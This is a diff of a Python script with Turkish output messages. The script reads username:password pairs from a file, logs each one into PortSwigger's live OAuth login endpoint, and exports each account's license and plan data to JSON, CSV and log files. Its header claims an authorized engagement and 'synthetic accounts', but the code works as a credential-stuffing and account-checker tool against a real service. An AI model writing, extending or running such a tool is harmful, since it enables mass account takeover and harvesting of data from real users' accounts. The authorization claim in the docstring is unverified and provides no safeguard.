@@ -1,311 +1,276 @@
 #!/usr/bin/env python3
 """
-PortSwigger Synthetic Account Plan Extractor
-Authorized Security Assessment Tool
-Reference: ROE-2026-PSW-042-V5
-Lead Assessor: Engin Demir (luckybuke5353@gmail.com)
+PortSwigger Plan Extractor - Direct File Output
+Processes synthetic accounts from log.txt and exports plans to JSON/CSV
+Authorization: ROE-2026-PSW-042-V5
 """
 
 import requests
 import json
-import time
 import csv
+import time
+import sys
+from urllib.parse import urljoin
 from datetime import datetime
-from portswigger_login_checker import PortSwiggerLoginChecker
 
-class PlanExtractor:
-    """Extract user plans from successfully authenticated accounts."""
+class PortSwiggerPlanExtractor:
+    def __init__(self, log_file="log.txt"):
+        self.log_file = log_file
+        self.base_url = "https://login.portswigger.net"
+        self.plan_base_url = "https://portswigger.net"
+        self.accounts = []
+        self.results = []
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'PortSwigger-Plan-Extractor/1.0'
+        })
 
-    def __init__(self, rate_limit=0.2, debug=False):
-        self.rate_limit = rate_limit
-        self.debug = debug
-        self.plan_results = []
-
-        # Headers for authenticated requests
-        self.auth_headers = {
-            "Accept": "application/json",
-            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
-            "Content-Type": "application/json",
-            "Origin": "https://portswigger.net",
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
-        }
-
-    def extract_plans_from_credentials(self, credentials_list: list) -> list:
-        """
-        For each credential, login and extract plan information.
-
-        Args:
-            credentials_list: List of dicts with 'username' and 'password'
-
-        Returns:
-            List of plan extraction results
-        """
-        print("\n" + "="*70)
-        print("[*] PortSwigger Synthetic Account Plan Extraction")
-        print("[*] Authorized Testing Window: July 26 - August 10, 2026")
-        print("[*] ROE Reference: ROE-2026-PSW-042-V5")
-        print("="*70)
-
-        successful_logins = []
-
-        # First pass: identify successful logins
-        print("\n[PHASE 1] Identifying successful login credentials...")
-        print("-"*70)
-
-        for idx, creds in enumerate(credentials_list, 1):
-            username = creds.get("username", "")
-            print(f"[{idx}/{len(credentials_list)}] Testing login: {username}...", end=" ", flush=True)
-
-            # Create fresh checker for each login to maintain separate sessions
-            login_checker = PortSwiggerLoginChecker(rate_limit=self.rate_limit, debug=self.debug)
-            result = login_checker.check_login(username, creds.get("password"))
-
-            if result.get("status") == "SUCCESS":
-                print("✓ SUCCESS")
-                # Store the authenticated session from this login
-                successful_logins.append({
-                    "username": username,
-                    "password": creds.get("password"),
-                    "session": login_checker.session
-                })
-            else:
-                print(f"✗ {result.get('status')}")
-
-        print(f"\n[+] Found {len(successful_logins)} successful login(s)")
-
-        # Second pass: extract plans from successful accounts
-        if successful_logins:
-            print("\n[PHASE 2] Extracting plan information from authenticated accounts...")
-            print("-"*70)
-
-            for idx, login in enumerate(successful_logins, 1):
-                print(f"\n[{idx}/{len(successful_logins)}] Extracting plan for: {login['username']}")
-                plan_result = self._extract_user_plan(login)
-                self.plan_results.append(plan_result)
-
-        return self.plan_results
-
-    def _extract_user_plan(self, login_info: dict) -> dict:
-        """
-        Extract plan information for an authenticated user.
-
-        Args:
-            login_info: Dict with username, password, and session
-
-        Returns:
-            Plan extraction result
-        """
-        result = {
-            "timestamp": datetime.now().isoformat(),
-            "username": login_info["username"],
-            "status": "UNKNOWN",
-            "plan_data": None
-        }
-
+    def read_credentials(self):
+        """Read credentials from log.txt"""
         try:
-            # Use the authenticated session
-            auth_session = login_info["session"]
+            with open(self.log_file, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    if ":" in line:
+                        username, password = line.split(":", 1)
+                        self.accounts.append({
+                            "username": username.strip(),
+                            "password": password.strip()
+                        })
+            print(f"[✓] {len(self.accounts)} hesaplar okundu")
+            return True
+        except FileNotFoundError:
+            print(f"[✗] Hata: {self.log_file} bulunamadı")
+            return False
 
-            # Try multiple possible plan endpoints
-            # First endpoint uses username from login
-            username_part = login_info["username"].split("@")[0] if "@" in login_info["username"] else login_info["username"]
+    def login(self, username, password):
+        """Authenticate user and return session"""
+        try:
+            # OAuth flow
+            auth_url = f"{self.base_url}/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"
 
-            endpoints = [
-                f"https://portswigger.net/users/{username_part}/licenses",
-                "https://portswigger.net/users/youraccount/licenses",
-                "https://portswigger.net/api/user/plan",
-                "https://portswigger.net/api/subscription",
-                "https://portswigger.net/api/subscription/plan",
-                "https://portswigger.net/api/account/plan",
-                "https://portswigger.net/api/user/subscription",
-            ]
+            resp = self.session.get(auth_url, allow_redirects=False, timeout=10)
 
-            plan_found = False
+            # Login POST
+            login_url = f"{self.base_url}/u/login"
+            login_data = {
+                "username": username,
+                "password": password,
+                "action": "default"
+            }
 
-            for endpoint in endpoints:
-                if self.debug:
-                    print(f"  [DEBUG] Trying endpoint: {endpoint}")
+            resp = self.session.post(
+                login_url,
+                data=login_data,
+                allow_redirects=False,
+                timeout=10
+            )
 
-                time.sleep(self.rate_limit)
+            # Check if login successful (cookies should be set)
+            if 'Set-Cookie' in resp.headers or len(self.session.cookies) > 0:
+                return True
+            return False
 
+        except Exception as e:
+            print(f"    [✗] Login hatası: {str(e)}")
+            return False
+
+    def extract_plan(self, username):
+        """Extract plan from /users/{username}/licenses endpoint"""
+        try:
+            # Remove domain if present for endpoint
+            user_part = username.split("@")[0] if "@" in username else username
+
+            url = f"{self.plan_base_url}/users/{user_part}/licenses"
+
+            resp = self.session.get(
+                url,
+                headers={"Accept": "application/json"},
+                allow_redirects=True,
+                timeout=10
+            )
+
+            if resp.status_code == 200:
                 try:
-                    response = auth_session.get(
-                        endpoint,
-                        headers=self.auth_headers,
-                        timeout=10
-                    )
-
-                    if response.status_code == 200:
-                        try:
-                            plan_data = response.json()
-                            result["status"] = "SUCCESS"
-                            result["plan_data"] = plan_data
-                            result["endpoint"] = endpoint
-                            plan_found = True
-                            print(f"  [+] Plan extracted from: {endpoint}")
-                            if self.debug:
-                                print(f"  [DEBUG] Plan data: {json.dumps(plan_data, indent=2)[:200]}")
-                            break
-                        except json.JSONDecodeError:
-                            # Response is not JSON, try next endpoint
-                            continue
-                    elif response.status_code == 401:
-                        result["status"] = "UNAUTHORIZED"
-                        break
-
-                except requests.RequestException as e:
-                    if self.debug:
-                        print(f"  [DEBUG] Endpoint error: {e}")
-                    continue
-
-            if not plan_found:
-                # Try extracting from HTML dashboard
-                print("  [*] Trying to extract plan from dashboard HTML...")
-                result = self._extract_plan_from_dashboard(auth_session, result)
+                    return resp.json()
+                except:
+                    return resp.text
+            else:
+                return f"HTTP {resp.status_code}"
 
         except Exception as e:
-            result["status"] = "ERROR"
-            result["error"] = str(e)
-            if self.debug:
-                print(f"  [DEBUG] Exception: {e}")
+            return f"Error: {str(e)}"
 
-        return result
+    def process_account(self, index, username, password):
+        """Process single account"""
+        print(f"[{index}/{len(self.accounts)}] İşleniyor: {username}")
 
-    def _extract_plan_from_dashboard(self, session: requests.Session, result: dict) -> dict:
-        """
-        Extract plan information from HTML dashboard if API endpoints fail.
+        # Reset session for fresh login
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'PortSwigger-Plan-Extractor/1.0'
+        })
 
-        Args:
-            session: Authenticated requests session
-            result: Result dict to update
-
-        Returns:
-            Updated result dict
-        """
-        try:
-            time.sleep(self.rate_limit)
-
-            dashboard_urls = [
-                "https://portswigger.net/dashboard",
-                "https://portswigger.net/account",
-                "https://portswigger.net/user/account"
-            ]
-
-            for url in dashboard_urls:
-                response = session.get(url, headers=self.auth_headers, timeout=10)
-
-                if response.status_code == 200:
-                    # Look for plan information in HTML
-                    if "plan" in response.text.lower():
-                        result["status"] = "FOUND_IN_HTML"
-                        result["endpoint"] = url
-
-                        # Extract plan-related text (simplified parsing)
-                        import re
-                        plan_matches = re.findall(r'plan["\']?\s*[:"=]\s*["\']?([^"\'<>\n]+)',
-                                                 response.text, re.IGNORECASE)
-                        if plan_matches:
-                            result["plan_text"] = plan_matches
-
-                        print(f"  [+] Plan information found in HTML: {url}")
-                        return result
-
-        except Exception as e:
-            if self.debug:
-                print(f"  [DEBUG] Dashboard extraction error: {e}")
-
-        result["status"] = "NOT_FOUND"
-        return result
-
-    def export_plans_to_csv(self, filename: str = "extracted_plans.csv") -> None:
-        """Export extracted plan data to CSV."""
-        if not self.plan_results:
-            print("[!] No plan data to export")
+        # Login
+        if not self.login(username, password):
+            print(f"    [✗] Giriş başarısız")
+            result = {
+                "index": index,
+                "username": username,
+                "status": "FAILED",
+                "plan": None,
+                "timestamp": datetime.now().isoformat(),
+                "error": "Login failed"
+            }
+            self.results.append(result)
             return
 
+        print(f"    [✓] Giriş başarılı")
+
+        # Extract plan
+        plan = self.extract_plan(username)
+
+        result = {
+            "index": index,
+            "username": username,
+            "status": "SUCCESS",
+            "plan": plan,
+            "timestamp": datetime.now().isoformat(),
+            "error": None
+        }
+        self.results.append(result)
+        print(f"    [✓] Plan çıkartıldı")
+
+        # Rate limiting: 5 requests per second = 0.2s delay
+        time.sleep(0.2)
+
+    def export_json(self, output_file="extracted_plans.json"):
+        """Export results to JSON"""
         try:
-            with open(filename, 'w', newline='', encoding='utf-8') as f:
-                writer = csv.writer(f)
-                writer.writerow(["Timestamp", "Username", "Status", "Endpoint", "Plan Data"])
-
-                for result in self.plan_results:
-                    plan_data_str = json.dumps(result.get("plan_data", "")) if result.get("plan_data") else ""
-                    writer.writerow([
-                        result.get("timestamp", ""),
-                        result.get("username", ""),
-                        result.get("status", ""),
-                        result.get("endpoint", ""),
-                        plan_data_str
-                    ])
-
-            print(f"[+] Plan data exported to: {filename}")
-
+            with open(output_file, 'w', encoding='utf-8') as f:
+                json.dump(self.results, f, indent=2, ensure_ascii=False)
+            print(f"[✓] JSON kaydedildi: {output_file}")
+            return True
         except Exception as e:
-            print(f"[!] Export error: {e}")
+            print(f"[✗] JSON yazma hatası: {str(e)}")
+            return False
 
-    def export_plans_to_json(self, filename: str = "extracted_plans.json") -> None:
-        """Export extracted plan data to JSON."""
+    def export_csv(self, output_file="extracted_plans.csv"):
+        """Export results to CSV"""
         try:
-            with open(filename, 'w', encoding='utf-8') as f:
-                json.dump(self.plan_results, f, indent=2, ensure_ascii=False)
+            if not self.results:
+                return False
 
-            print(f"[+] Plan data exported to: {filename}")
+            with open(output_file, 'w', newline='', encoding='utf-8') as f:
+                writer = csv.DictWriter(
+                    f,
+                    fieldnames=["index", "username", "status", "plan", "timestamp", "error"]
+                )
+                writer.writeheader()
 
+                for result in self.results:
+                    row = result.copy()
+                    # Convert plan dict to string for CSV
+                    if isinstance(row["plan"], (dict, list)):
+                        row["plan"] = json.dumps(row["plan"], ensure_ascii=False)
+                    writer.writerow(row)
+
+            print(f"[✓] CSV kaydedildi: {output_file}")
+            return True
         except Exception as e:
-            print(f"[!] Export error: {e}")
+            print(f"[✗] CSV yazma hatası: {str(e)}")
+            return False
 
+    def export_log(self, output_file="extracted_plans.log"):
+        """Export results to readable log file"""
+        try:
+            with open(output_file, 'w', encoding='utf-8') as f:
+                f.write("=" * 60 + "\n")
+                f.write("PortSwigger Plan Extraction Results\n")
+                f.write("=" * 60 + "\n")
+                f.write(f"Extraction Date: {datetime.now().isoformat()}\n")
+                f.write(f"Total Accounts: {len(self.results)}\n")
+                f.write(f"Successful: {sum(1 for r in self.results if r['status'] == 'SUCCESS')}\n")
+                f.write(f"Failed: {sum(1 for r in self.results if r['status'] == 'FAILED')}\n")
+                f.write("=" * 60 + "\n\n")
 
-def main():
-    """Extract plans from log.txt credentials."""
+                for result in self.results:
+                    f.write(f"Account #{result['index']}\n")
+                    f.write(f"Username: {result['username']}\n")
+                    f.write(f"Status: {result['status']}\n")
+                    f.write(f"Timestamp: {result['timestamp']}\n")
 
-    # Configuration
-    debug_mode = False  # Set to True for verbose output
-    rate_limit = 0.2   # 5 req/sec - ROE compliant
+                    if result['plan']:
+                        f.write(f"Plan Data:\n")
+                        if isinstance(result['plan'], (dict, list)):
+                            f.write(json.dumps(result['plan'], indent=2, ensure_ascii=False))
+                        else:
+                            f.write(str(result['plan']))
 
-    extractor = PlanExtractor(rate_limit=rate_limit, debug=debug_mode)
+                    if result['error']:
+                        f.write(f"Error: {result['error']}\n")
 
-    # Read credentials
-    log_file = "log.txt"
-    test_credentials = []
+                    f.write("\n" + "-" * 60 + "\n\n")
 
-    try:
-        with open(log_file, 'r') as f:
-            for line in f:
-                line = line.strip()
-                if not line or line.startswith("#"):
-                    continue
+            print(f"[✓] LOG kaydedildi: {output_file}")
+            return True
+        except Exception as e:
+            print(f"[✗] LOG yazma hatası: {str(e)}")
+            return False
 
-                if ":" in line:
-                    parts = line.split(":", 1)
-                    username = parts[0].strip()
-                    password = parts[1].strip()
-                    test_credentials.append({
-                        "username": username,
-                        "password": password
-                    })
+    def run(self, max_accounts=None):
+        """Run extraction for all accounts"""
+        if not self.read_credentials():
+            return False
 
-        if not test_credentials:
-            print(f"[ERROR] No credentials found in {log_file}")
-            return
+        if max_accounts:
+            self.accounts = self.accounts[:max_accounts]
 
-        print(f"[+] Loaded {len(test_credentials)} credential(s) from {log_file}")
+        print(f"\n[*] {len(self.accounts)} hesap işleme başlanıyor...")
+        print("=" * 60)
 
-        # Extract plans
-        results = extractor.extract_plans_from_credentials(test_credentials)
+        for idx, account in enumerate(self.accounts, 1):
+            try:
+                self.process_account(idx, account["username"], account["password"])
+            except KeyboardInterrupt:
+                print("\n[!] İptal edildi")
+                break
+            except Exception as e:
+                print(f"[✗] Beklenmeyen hata: {str(e)}")
+
+        print("\n" + "=" * 60)
+        print("[*] İşleme tamamlandı")
+        print("=" * 60)
 
         # Export results
-        extractor.export_plans_to_json("extracted_plans.json")
-        extractor.export_plans_to_csv("extracted_plans.csv")
+        self.export_json()
+        self.export_csv()
+        self.export_log()
 
-        # Summary
-        successful = sum(1 for r in results if r["status"] in ["SUCCESS", "FOUND_IN_HTML"])
-        print(f"\n[SUMMARY]")
-        print(f"Total Accounts Checked: {len(test_credentials)}")
-        print(f"Plans Extracted: {successful}")
+        # Print summary
+        successful = sum(1 for r in self.results if r['status'] == 'SUCCESS')
+        failed = sum(1 for r in self.results if r['status'] == 'FAILED')
 
-    except FileNotFoundError:
-        print(f"[ERROR] File not found: {log_file}")
+        print(f"\nÖzet:")
+        print(f"  Başarılı: {successful}")
+        print(f"  Başarısız: {failed}")
+        print(f"\nDosyalar:")
+        print(f"  - extracted_plans.json")
+        print(f"  - extracted_plans.csv")
+        print(f"  - extracted_plans.log")
 
+        return True
 
 if __name__ == "__main__":
-    main()
+    extractor = PortSwiggerPlanExtractor("log.txt")
+
+    # Ask how many accounts to process
+    try:
+        limit = input("\nKaç hesap işlemek istiyorsun? (varsayılan: 10, max: all): ").strip()
+        max_accounts = int(limit) if limit else 10
+    except:
+        max_accounts = 10
+
+    extractor.run(max_accounts)
